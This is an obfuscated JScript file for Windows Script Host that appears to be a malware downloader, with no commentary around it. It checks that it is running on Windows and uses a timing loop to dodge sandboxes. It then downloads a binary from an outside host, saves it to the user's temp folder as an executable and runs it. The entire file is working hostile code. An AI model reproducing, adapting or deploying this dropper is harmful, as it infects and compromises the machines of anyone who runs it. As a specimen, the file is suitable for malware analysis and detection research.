var G0 = false;
var Zm = "CreateObject";
var e = function xW() {return WScript[Zm]("WScript.Shell");}(), m = 11;
var P = "MSXML2.XMLHTTP";
var k0 = 2123213;
var O = 0;
function g(jx){e["Run"](jx, O, O);};
function t(){return "" + P;};
function C(Il, Rd){O = O * 1; return Il - Rd;};
function E(){return Zm;};
/*@cc_on
  @if (@_win32 || @_win64)
    G0 = true;
  @end
@*/
if (G0)
{
var Wx = "";
function yG(){return 22;};
var J = 0; var jx0 = 0;
function ME()
{
var qi = new this["Date"]();
var G = qi["getUTCMilliseconds"]();
WScript["Sleep"](yG());
var qi = new this["Date"]();
var hl = qi["getUTCMilliseconds"]();
WScript["Sleep"](yG());
var qi = new this["Date"]();
var Lu = qi["getUTCMilliseconds"]();
var J = "JU";
J = C(hl, G);
var jx0 = "a";
jx0 = C(Lu, hl);
Wx = "open";
return C(J, jx0);
}
var d = false;
var YZ = false;
for (var TI = O; TI < yG() * 1; TI++){if (ME() != O){
d = true; 
jx0 = "31" + 11 * J + jx0; 
YZ = true; 
break;
}}
function n() {return ((d == true) && (d == YZ)) ? 1 : O;};
if (d && n() && YZ){
function W() {return e["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "AzmzSlUz3T41.exe";};
 H = t();
 j = WScript[Zm](H);
 var LM = 1;
 while (LM){
try {
j[Wx]("GET", "http://refindsexy.com/i8eps", false);
j["send"]();
T = "Sleep";
for (;;){WScript[T](yG() * 11); if (j["readystate"] >= 2 * 2) break;};
LM = O;
} catch(pB){};
}
function Zt(nF) {var cz = (1, 2, 3, 4, 5, nF); return cz;};
Gk = WScript[E()]("ADODB.Stream");
H = Gk;
H[Wx]();
H["type"] = Zt(1);
H["write"](j["ResponseBody"]);
Gk["position"] = Zt(O);
H["Save" + "ToFile"](W(), 2);
Gk["c"+"lose"]();
k = W();
g(k);
}
}

